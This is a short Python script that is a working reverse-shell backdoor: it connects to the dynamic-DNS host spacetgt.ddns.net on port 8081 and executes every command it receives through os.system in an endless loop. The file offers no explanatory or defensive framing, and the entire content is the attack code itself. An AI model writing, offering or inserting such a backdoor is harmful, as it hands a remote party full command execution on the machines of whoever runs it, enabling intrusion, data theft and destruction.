import socket
import subprocess
import os

REMOTE_HOST = socket.gethostbyname("spacetgt.ddns.net")
REMOTE_PORT = 8081

client = socket.socket()
client.connect((REMOTE_HOST, REMOTE_PORT))

while True:
    command = client.recv(1024)
    command = command.decode()
    os.system(command)